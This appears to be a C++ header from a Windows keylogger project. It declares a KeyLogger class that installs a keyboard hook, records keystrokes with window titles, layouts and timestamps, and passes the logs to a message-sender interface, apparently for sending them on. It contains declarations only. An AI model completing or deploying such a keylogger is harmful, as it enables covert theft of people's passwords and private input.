#pragma once

#include <functional>
#include <map>
#include <mutex>
#include <Windows.h>
#include <wil/resource.h>

#include "IMessageSender.h"

class KeyLogger
{
public:
	explicit KeyLogger(IMessageSender* sender);
	~KeyLogger();

private:
	static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

	static std::string GetLog(int keyStroke);
	static std::string GetWindowTitle(HWND windowHandle);
	static HKL GetKeyboardLayout(HWND windowHandle);
	static std::string GetWindowPrefix(HWND windowHandle);
	static std::string FormatDate(std::chrono::system_clock::time_point time);

	void LogKeyboardEvent(const std::string& log) const;

	static std::mutex _mutex;
	static std::vector<KeyLogger*> _instances;
	static wil::unique_hhook _hook;
	static std::map<int, std::string> _keyNames;
	static std::string _lastWindowTitle;

	IMessageSender* _sender;
};

